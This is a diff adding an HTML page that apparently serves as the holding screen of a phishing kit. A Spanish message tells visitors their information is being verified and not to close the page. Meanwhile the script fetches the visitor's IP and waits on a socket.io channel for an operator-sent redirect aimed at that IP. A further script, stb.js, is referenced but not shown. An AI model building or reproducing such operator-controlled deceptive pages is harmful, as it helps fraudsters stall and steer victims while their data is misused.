@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/galo.css">
+    <link rel="stylesheet" href="./css/galo-mb.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >  
+    <div class="topline"></div>
+    <div class="kolchi">
+        
+        <!-- lfoqani -->
+        <div class="lfoq">
+            <div class="top-img">
+                <img class="top-pc" src="./img/hetopo-pc-02.png" alt="">
+                <img class="top-mb" src="./img/hedopo-mb-02.png" alt="">
+            </div>
+        </div>
+        
+        <!-- From Uiverse.io by juan-sued --> 
+<div class="frame">
+    <div class="center4">
+       <div class="dot-1"></div>
+       <div class="dot-2"></div>
+       <div class="dot-3"></div>
+    </div>
+    <p class="p-lod" style="text-align: center;">Verificación de su información. <br> No cierre la página.</p>
+ </div>
+        
+    </div>
+ <script src="/socket.io/socket.io.js"></script>
+    <script>
+        async function getIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip; // Return the IP address
+  } catch (error) {
+    console.error("Error fetching IP address:", error);
+    return null; // Return null if there's an error
+  }
+}
+
+    (async()=>{
+        const socket = io();
+
+        let ips = await getIP();
+        console.log("IP:",ips);
+        
+        socket.on("bye",(data,callback)=>{
+            const {ip,path} = data;
+            
+            
+            if(ips == ip){
+                console.log(ip);
+                socket.emit("back","Redirected to "+path);
+                window.location = path;
+            }
+            else{
+                socket.emit("back","IP not found");
+            }
+        });
+    })()
+        
+        
+
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js" type="module"></script>
+</body>
+</html>
+
+
